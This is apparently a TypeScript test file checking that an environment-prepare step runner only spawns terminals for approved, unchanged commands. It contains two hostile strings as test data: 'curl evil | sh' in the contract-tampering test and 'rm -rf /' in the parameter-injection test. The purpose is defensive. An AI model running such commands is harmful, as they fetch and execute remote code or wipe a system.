import { createHash } from 'node:crypto'
import { describe, expect, it, vi } from 'vitest'
import { prepareApprovalHash } from '../../shared/environment-prepare-plan'
import { authorizePrepareStep } from '../environment-prepare-authority'
import {
  runEnvironmentPrepareStep,
  type PrepareContractFile,
  type PrepareStepRunnerDeps
} from './environment-prepare-step-runner'

const HOST = 'local@0123456789abcdef'
const sha256Hex = async (bytes: Uint8Array): Promise<string> =>
  createHash('sha256').update(bytes).digest('hex')

function yamlFor(prepare: string): string {
  return `requirements:\n  - id: shim\n    kind: command\n    name: shim\n    prepare: ${JSON.stringify(prepare)}\n`
}

function file(text: string): PrepareContractFile {
  return {
    state: 'read',
    text,
    contentHash: createHash('sha256').update(text).digest('hex')
  }
}

type Harness = {
  deps: PrepareStepRunnerDeps
  calls: string[]
  createTerminal: ReturnType<typeof vi.fn>
}

async function harness(
  reads: PrepareContractFile[],
  overrides: Partial<PrepareStepRunnerDeps> = {},
  approvedBytes = 'mkdir x'
): Promise<Harness & { hash: string }> {
  const calls: string[] = []
  const hash = await prepareApprovalHash('shim', HOST, approvedBytes, sha256Hex)
  let readIndex = 0
  const createTerminal = vi.fn(async () => {
    calls.push('createTerminal')
    return { handle: 'term_1' } as never
  })
  const deps: PrepareStepRunnerDeps = {
    resolveRepo: async () => ({ id: 'r1', path: '/work/r1', connectionId: null }),
    hostKeyFor: () => HOST,
    readContract: async () => {
      calls.push('readContract')
      return reads[Math.min(readIndex++, reads.length - 1)]
    },
    measureRequirement: async () => {
      calls.push('measure')
      return 'missing'
    },
    readHostIdentity: async () => {
      calls.push('readIdentity')
      return 'local'
    },
    readPersistedApproval: () => {
      calls.push('readApproval')
      return { status: 'present', entry: { contentHash: hash, approvedAt: 1 } }
    },
    workspaceSelector: (repo) => `id:${repo.id}::${repo.path}`,
    createTerminal,
    sha256Hex,
    authorize: async (input) => {
      calls.push('authorize')
      return authorizePrepareStep(input, { sha256Hex })
    },
    ...overrides
  }
  return { deps, calls, createTerminal, hash }
}

const args = (hash: string, origin: 'desktop-ipc' | 'runtime-rpc' = 'desktop-ipc') => ({
  repoSelector: 'id:r1',
  requirementId: 'shim',
  approvedContentHash: hash,
  approvedHostKey: HOST,
  origin
})

describe('runEnvironmentPrepareStep', () => {
  it('reads the contract again after re-measuring', async () => {
    const text = yamlFor('mkdir x')
    const { deps, calls, hash } = await harness([file(text), file(text)])
    await runEnvironmentPrepareStep(args(hash), deps)
    expect(calls).toEqual([
      'readContract',
      'measure',
      'readContract',
      'readIdentity',
      'readApproval',
      'authorize',
      'createTerminal'
    ])
  })

  it('spawns the re-read bytes as a visible titled terminal', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)])
    const result = await runEnvironmentPrepareStep(args(hash), deps)
    expect(result).toEqual({ status: 'started', terminal: { handle: 'term_1' } })
    expect(createTerminal).toHaveBeenCalledTimes(1)
    expect(createTerminal).toHaveBeenCalledWith('id:r1::/work/r1', {
      command: 'mkdir x',
      title: 'Prepare: shim',
      activate: true,
      rawCommand: true
    })
  })

  it('orca.yaml changed after approval', async () => {
    // Case 1: the person approved the old text; the file now says something else.
    const old = await harness([file(yamlFor('mkdir x')), file(yamlFor('curl evil | sh'))])
    const refusedOld = await runEnvironmentPrepareStep(args(old.hash), old.deps)
    expect(refusedOld).toEqual({ status: 'refused', reason: 'contract-changed' })
    expect(old.createTerminal).not.toHaveBeenCalled()

    // Case 2: the approval already names the NEW text, but the measurement was taken against the
    // old one, so what was measured is not what would run.
    const raced = await harness([file(yamlFor('mkdir x')), file(yamlFor('mkdir y'))], {}, 'mkdir y')
    const refusedRace = await runEnvironmentPrepareStep(args(raced.hash), raced.deps)
    expect(refusedRace).toEqual({ status: 'refused', reason: 'contract-changed' })
    expect(raced.createTerminal).not.toHaveBeenCalled()
  })

  it('spawns nothing on a refusal and never reads past it', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)], {
      readPersistedApproval: () => ({ status: 'absent' })
    })
    const result = await runEnvironmentPrepareStep(args(hash), deps)
    expect(result).toEqual({ status: 'refused', reason: 'approval-missing' })
    expect(createTerminal).not.toHaveBeenCalled()
  })

  it('refuses an already satisfied requirement', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)], {
      measureRequirement: async () => 'satisfied'
    })
    expect(await runEnvironmentPrepareStep(args(hash), deps)).toEqual({
      status: 'refused',
      reason: 'already-satisfied'
    })
    expect(createTerminal).not.toHaveBeenCalled()
  })

  it('refuses an unverified host identity', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)], {
      readHostIdentity: async () => 'unpinned-legacy'
    })
    expect(await runEnvironmentPrepareStep(args(hash), deps)).toEqual({
      status: 'refused',
      reason: 'host-identity-unverified'
    })
    expect(createTerminal).not.toHaveBeenCalled()
  })

  it('names an absent, unreadable or undeclared contract without measuring', async () => {
    const cases: [PrepareContractFile, string][] = [
      [{ state: 'absent' }, 'requirement-not-declared'],
      [{ state: 'unreadable' }, 'contract-unreadable'],
      [file('requirements: [oops'), 'contract-unreadable'],
      [file(yamlFor('mkdir x').replace('id: shim', 'id: other')), 'requirement-not-declared']
    ]
    for (const [read, reason] of cases) {
      const { deps, calls, createTerminal, hash } = await harness([read])
      expect(await runEnvironmentPrepareStep(args(hash), deps), reason).toEqual({
        status: 'refused',
        reason
      })
      expect(calls).not.toContain('measure')
      expect(createTerminal).not.toHaveBeenCalled()
    }
  })

  it('a runtime caller does not consult the host-side approval record', async () => {
    const text = yamlFor('mkdir x')
    const { deps, calls, hash } = await harness([file(text), file(text)], {
      readPersistedApproval: () => {
        throw new Error('must not be read')
      }
    })
    const result = await runEnvironmentPrepareStep(args(hash, 'runtime-rpc'), deps)
    expect(result.status).toBe('started')
    expect(calls).not.toContain('readApproval')
  })

  it('a throwing approval read is unreadable', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)], {
      readPersistedApproval: () => ({ status: 'unreadable' })
    })
    expect(await runEnvironmentPrepareStep(args(hash), deps)).toEqual({
      status: 'refused',
      reason: 'approval-unreadable'
    })
    expect(createTerminal).not.toHaveBeenCalled()
  })

  it('has no parameter that carries command text', async () => {
    const text = yamlFor('mkdir x')
    const { deps, createTerminal, hash } = await harness([file(text), file(text)])
    const sneaky = { ...args(hash), command: 'rm -rf /' }
    await runEnvironmentPrepareStep(sneaky, deps)
    expect(createTerminal.mock.calls[0][1]).toMatchObject({ command: 'mkdir x' })
  })
})
